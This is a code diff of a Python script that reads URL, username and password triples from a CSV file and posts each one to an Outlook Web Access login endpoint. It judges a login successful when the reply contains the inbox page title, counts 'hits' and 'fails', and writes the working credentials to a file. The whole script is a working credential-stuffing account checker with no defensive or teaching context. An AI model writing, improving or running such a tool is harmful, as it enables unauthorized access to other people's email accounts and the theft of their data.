@@ -1,41 +1,57 @@
 
 import requests
+from bs4 import BeautifulSoup as bs
 import csv 
 import re 
+import time
 #latest1
-
-
-
+hit=0
+fail=0 
+bobo=[]
 
 def sendreq(url,values):
-    hit=0
-    fail=0
-    response = requests.post(url, data=values)
-    status=response.status_code
-    print(status)
-    kuntent=response.text
-    if "<title>Bandeja de entrada - Outlook</title>" in kuntent:
+    try:
+        response = requests.post(url, data=values)
+        status=response.status_code
+        print(status)
+        open('owa3.html', 'wb').write(response.content)
+        kuntent=response.text
+        
+    except Exception:
+        return
+    return status,kuntent
+
+def valids():
+    global hit
+    global fail
+    global bobo 
+    if "<title>Bandeja de entrada - Outlook</title>" in rk[1]:
         print("Success")
         hit=hit+1
         omk='{}|{}|{}'.format(y,user,pas)
         print(omk)
-        open('hit.txt', 'w').write(omk)
-    elif status==200:
+        bobo.append(omk)
+    elif "Inbox" in rk[1]:
         print("Success")
         hit=hit+1
         omk='{}|{}|{}'.format(y,user,pas)
         print(omk)
-        open('hit.txt', 'w').write(omk)
-    elif status==500:
+        bobo.append(omk)
+    elif "The user name or password you entered isn't correct. Try entering it again" in rk[1]:
+        print("Fail,something is wrong")
+        fail=fail+1
+    elif rk[0]==500:
         print("Too many attempts or internal error")
-    elif "<title>Outlook</title>" in kuntent:
-        print("Fail,something is wrong ")
+    elif "<title>Outlook</title>" in rk[1]:
+        print("Fail,something is wrong")
         fail=fail+1
     else:
-        fail=fail+1  
-    return status,hit,fail
+        fail=fail+1
+    return hit,fail,bobo
 
 
+    
+    
 
 
 with open('values.csv', newline='') as csvf:
@@ -44,11 +60,13 @@ with open('values.csv', newline='') as csvf:
         y= rd[0]
         user=rd[1]
         pas=rd[2]
+        print(rd[1])
         patt = r".*auth"
         mwe = re.findall(patt,y)
         for matches in mwe :
             matchesnew= matches+'.owa'
             matchesold= matches.replace('/auth', '')
+            print(matchesnew)
             url = matchesnew
             values = {'destination': matchesold,
                       'flags' : '4',
@@ -57,10 +75,28 @@ with open('values.csv', newline='') as csvf:
                       'password': pas,
                       'passwordText': '',
                       'isUtf8': '1',}
-            rk=sendreq(url,values)  
+            rk=sendreq(url,values)
+            mk=valids()
+            hit=mk[0]
+            fail=mk[1]
+            bobo=mk[2]
+
+
+
+
+            
+                
+            
+print('HIT-->',hit)
+print('fails-->',fail)
+print(bobo)
+#open('hit.txt', 'w').write(str(mk[2]))
+with open("file.txt", 'w') as output:
+    for row in bobo:
+        output.write(str(row) + '\n')
             
 
-print("hits saved in hits.txt")
+
             
 
 
